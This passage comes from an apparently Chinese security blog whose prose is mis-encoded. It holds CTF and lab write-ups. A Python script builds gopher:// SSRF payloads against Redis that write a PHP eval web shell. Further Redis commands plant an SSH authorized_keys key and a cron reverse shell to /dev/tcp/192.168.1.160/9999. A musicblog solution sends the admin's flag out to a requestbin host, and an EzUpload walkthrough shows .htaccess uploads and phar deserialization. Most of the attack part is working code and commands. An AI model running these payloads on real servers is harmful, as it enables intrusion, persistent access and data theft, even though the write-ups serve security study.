<p>å¯ä»¥çœ‹åˆ°shellå·²ç»æˆåŠŸå†™å…¥ï¼Œè®¿é—®ä¸€ä¸‹è¯¥æ–‡ä»¶</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/3.png" class="">

<p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨è„šæœ¬æ¥ç”Ÿæˆï¼Œä¹‹å‰åšè¿‡ä¸€é“redisçš„ï¼Œè„šæœ¬è¿˜å­˜ç€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.52.253.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>

<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/4.png" class="">

<p>ç”¨ä¸Šé¢çš„è„šæœ¬ç”Ÿæˆpayloadï¼Œæ‰“è¿‡å»ï¼Œçœ‹ä¸€ä¸‹shell.phpæ–‡ä»¶å†…å®¹èƒ½å¦è¯»åˆ°</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/5.png" class="">

<p>æˆåŠŸï¼Œä¸‹é¢å°±å¯ä»¥getshelläº†ï¼Œçœ‹ä¸€ä¸‹æˆ‘è¿™å°linuxæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/6.png" class="">

<h4 id="å†™sshå…¬é’¥"><a href="#å†™sshå…¬é’¥" class="headerlink" title="å†™sshå…¬é’¥"></a>å†™sshå…¬é’¥</h4><p>åœ¨/rootä¸‹åˆ›å»ºä¸€ä¸ª.sshæ–‡ä»¶å¤¹</p>
<p>rediså‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„æ˜¯ä¿®æ”¹äº†ä¸Šé¢çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">shell=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP1+B2rcH7ejmH9znCeQdIshPuCkiA+eAYZwApNT5vimPsk7OrP8Qw6GDKrGskY8N6tTH6YGZiNqxpVtEZIYDhiSnRxoplcGgFmMY9pCjFgUKifrN6xeA4PSuxNtUGpcOKVzs/T8SJaHLEtCzKLMnySZ/xBpMQ4CftbH1LKKNQTZRq0XCICW8q9TtZZhvhCnBqIDRD4EmmRGurObK67PjX4kPo1Ej5fIeEYUDN+tHpRP2t4a5BAgdqs7veoQS0GE6774yLyyD+LmaoiNH9NuymVQ36DZ9jOsofYDG173OKrx4tIHW3/xtYQKwgHq9TNYbmXl/c1n5Y3s1ZJ/i/2YruVcRUSMo0u1GgkNn2PDcSw2h2BGZLHm9tGLHe6mSzCIg59RBIT3SXAXqSxwzwpIlchwN0clpnnAhzd4jkKkl1usorrNL8WTWt6kLrD18SaOOO4mZStRX6nKTL3Wo/6V+A75kUQZZMeLgRxU0vWe3wnSHazwKKpf2WjDaGum3vUw0= root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></table></figure>

<p>æ‰“è¿‡å»</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/7.png" class="">

<p>çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½è¯»åˆ°è¯¥æ–‡ä»¶</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/8.png" class="">

<p>æˆåŠŸå†™å…¥äº†ï¼Œä½†æ˜¯sshè¿ä¸ä¸Šï¼Œè·Ÿæˆ‘å¼€å§‹æƒ³çš„ä¸€æ ·ï¼Œåº”è¯¥è¦ä¸¤å°linuxæ¥è¿›è¡Œè¯¥æ“ä½œï¼Œå¹¶ä¸”å¦ä¸€å°ä¹Ÿè¦è£…äº†redisï¼Œæ‰¾äº†ç¯‡æ–‡ç« ï¼Œæœ‰å…·ä½“æ“ä½œï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œçœ‹äº†é‚£äº›å¸ˆå‚…çš„æ€è·¯ï¼Œä»¥åŠæ€»ç»“ï¼Œå¤§æ¦‚ç‡ä¸ä¼šç¢°åˆ°è¿™ç§æƒ…å†µçš„é¢˜<a href="https://www.cnblogs.com/cute-puli/p/10870885.htmlï¼Œè¿™å°±ä»¥åæœ‰æ—¶é—´å†è‡ªå·±æ“ä½œäº†" target="_blank" rel="noopener">https://www.cnblogs.com/cute-puli/p/10870885.htmlï¼Œè¿™å°±ä»¥åæœ‰æ—¶é—´å†è‡ªå·±æ“ä½œäº†</a></p>
<h4 id="å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</h4><p>èµ·ä¸¤å°æœºå­ï¼Œè™šæ‹Ÿæœºä¸Šè·‘ï¼Œéƒ½è¦è£…redis</p>
<p>ç›´æ¥ä¸Špayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.20:6379&gt;CONFIG SET dir &#x2F;var&#x2F;spool&#x2F;cron &lt;--åˆ‡æ¢åˆ°å®šæ—¶ä»»åŠ¡ç›®å½•</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;CONFIG SET dbfilename root   &lt;--ç”Ÿæˆä¸€ä¸ªåä¸ºrootçš„æ–‡ä»¶</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;set payload &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.160&#x2F;9999 0&gt;&amp;1\n\n&quot;  &lt;--è®¾ç½®åå¼¹shell</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;save </span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;exit</span><br></pre></td></tr></table></figure>

<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/9.png" class="">

<p>å¦ä¸€å°æœºå­ä¸Šç›‘å¬å¯¹åº”ç«¯å£å·ï¼Œå¾ˆå¿«å°±èƒ½å¼¹å›shellï¼Œä½†æ˜¯æˆ‘è¿™æœ‰ä¸€å°æ˜¯ubuntuï¼Œæ‰€ä»¥å¼¹ä¸å›ï¼Œæƒé™é—®é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯kali+centosï¼Œä¸‹æ¬¡è£…å¥½äº†å’Œä¸Šé¢çš„sshä¸€å—å†è¯•è¯•</p>
<h4 id="ä¸»ä»å¤åˆ¶SSRF"><a href="#ä¸»ä»å¤åˆ¶SSRF" class="headerlink" title="ä¸»ä»å¤åˆ¶SSRF"></a>ä¸»ä»å¤åˆ¶SSRF</h4><p>å¾…è¡¥å……â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>remaining</title>
    <url>/2020/08/06/remaining/</url>
    <content><![CDATA[<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog<a id="more"></a></h2><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li>CSPé™åˆ¶</li>
<li>strip_tagsæ¼æ´åˆ©ç”¨</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æºç é‡Œçš„worker.jsä¸­</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">'#like'</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°flagåœ¨UAå­—æ®µä¸­ï¼Œadminä¼šè‡ªåŠ¨ç‚¹å‡»likeæ ‡ç­¾</p>
<p>åœ¨util.phpä¸­ï¼Œå¯¹èƒ½ç”¨çš„æ ‡ç­¾åšäº†é™åˆ¶ï¼Œåªèƒ½ç”¨<code>&lt;audio&gt;</code>,æŸ¥æ‰¾strip_tagsï¼Œå½“strip_tagsä¸ç™½åå•æ ‡ç­¾ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œphpå…è®¸åœ¨ç™½åå•æ ‡ç­¾åç§°å†…å‡ºç°æ–œæ ï¼ˆâ€œ /â€ï¼‰ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°ç»“æœä¸­ã€‚(<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åœ¨<code>&lt;a/udio&gt;</code>å¯ä»¥ä½¿ç”¨aæ ‡ç­¾</p>
<p>åˆå­˜åœ¨CSPï¼Œä¸èƒ½è·¨åŸŸè¯·æ±‚ï¼Œå¯ä»¥ç”¨aæ ‡ç­¾è¿›è¡Œè¯·æ±‚</p>
<img src="/2020/08/06/remaining/1.png" class="">

<p>å¯ä»¥çœ‹åˆ°contentæ˜¯å¯æ§çš„ï¼Œä¸”ç”¨åˆ°äº†render_tagsæ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br><span class="line">æµè§ˆå™¨è§£æåå°±æˆäº†</span><br><span class="line">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·flagå°±ä¼šè¢«å¸¦å‡ºäº†</p>
<img src="/2020/08/06/remaining/2.png" class="">

<h2 id="D3CTF-2019-EzUpload-ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥"><a href="#D3CTF-2019-EzUpload-ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥" class="headerlink" title="[D3CTF 2019]EzUpload(ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥)"></a>[D3CTF 2019]EzUpload(ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥)</h2><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li>pharåè®®</li>
<li>åºåˆ—åŒ–</li>
<li>.htaccessæ–°å½¢å¼</li>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡checkåæ–‡ä»¶å†™å…¥ã€‚æ–‡ä»¶å†…å®¹ä»ä¼ å…¥çš„urlè¯»å–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å…è®¸è¯»å–è¿œç¨‹æ–‡ä»¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨vpsä¸Šè®¾ç½®æ–‡ä»¶ã€‚</p>
<p><code>checkdir()</code>æ£€æŸ¥äº†<code>$this-&gt;userdir</code>ï¼Œå…ˆæ”¾ç€</p>
<p><code>checkurl()</code>ç¦æ­¢äº†urlå‡ºç°<code>php|file</code>ï¼Œé˜²æ­¢ä½¿ç”¨ä¸¤ç§ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œé™¤äº†vpsä¸Šè®¾ç½®æ–‡ä»¶è¿˜å¯ä»¥ä½¿ç”¨<code>data://</code>åè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkext()&#96;ç¦æ­¢äº†&#96;filename&#96;å‡ºç°&#96;..&#96;ã€&#96;&#x2F;&#96;ã€&#96;ph&#96;ï¼Œå¯ä»¥æƒ³åˆ°&#96;.htaccess</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬çš„.htaccessæ ¼å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line"> SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æœ‰å¦ä¸€ç§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>

<p>å†™å…¥çš„.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦è·å–<code>upload/</code>ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡<code>__destruct()</code>ä¸­çš„ <code>echo $string;</code> è§¦å‘<code>__toString()</code>ï¼Œæ‰“å°<code>__DIR__</code>ï¼Œpharå¯ä»¥è¿›è¡Œgzipå‹ç¼©ï¼Œä»è€Œç»•è¿‡å¯¹ä¸€äº›å­—ç¬¦çš„æ£€æŸ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($d));</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"somnus2.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œgzipå‹ç¼©ï¼Œå†æ”¾åˆ°å†…ç½‘é¶æœºçš„webæœåŠ¡ä¸‹</p>
<p>å…ˆä¸Šä¼ </p>
<img src="/2020/08/06/remaining/3.png" class="">

<p>å†ç”¨pharè§¦å‘ååºåˆ—åŒ–</p>
<img src="/2020/08/06/remaining/4.png" class="">

<p>åŒæ ·çš„ï¼Œæ¥ä¸‹æ¥å†ç»å¯¹è·¯å¾„ä¸­å†™å…¥shell</p>
